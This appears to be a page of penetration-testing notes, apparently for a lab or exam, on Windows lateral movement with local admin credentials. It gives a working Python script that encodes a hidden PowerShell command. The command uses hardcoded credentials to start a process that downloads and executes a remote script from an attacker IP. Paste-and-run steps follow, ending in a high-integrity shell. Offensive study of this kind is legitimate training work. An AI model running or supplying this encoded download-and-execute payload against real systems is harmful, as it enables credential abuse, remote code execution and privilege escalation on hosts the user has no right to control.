# Local Admin Lateral Movement

Useful if unable to PsExec, RDP, WINRM, but has local admin creds and low-privileged shell

**ps\_script.py**

* Edit lines 5-6 to be local admin creds
* Edit line 8 for attacker's IP for simple\_ps\_revshell

{% code lineNumbers="true" %}
```python
import base64

# Prepare the corrected PowerShell payload script to run as Bill
payload = (
    "$p=ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force; "
    "$c=New-Object System.Management.Automation.PSCredential('client02\\bill',$p); "
    "Start-Process -FilePath 'powershell.exe' -ArgumentList "
    "'-NoProfile -ExecutionPolicy Bypass -Command iex (New-Object Net.WebClient).DownloadString(''http://192.168.45.218/runall.ps1'')' "
    "-Credential $c -WindowStyle Hidden"
)

# Encode the payload in UTF-16LE and then Base64
b64 = base64.b64encode(payload.encode('utf-16le')).decode('ascii')

# Construct the final one-liner for execution
one_liner = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {b64}"

# Display the one-liner
print(one_liner)
```
{% endcode %}

python ps\_script.py

<figure><img src="../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Then paste the encoded powershell command in the low privileged shell

<figure><img src="../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (337).png" alt=""><figcaption><p>This is normal!</p></figcaption></figure>

Obtained high integrity shell (checked using `whoami /all`)

<figure><img src="../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>
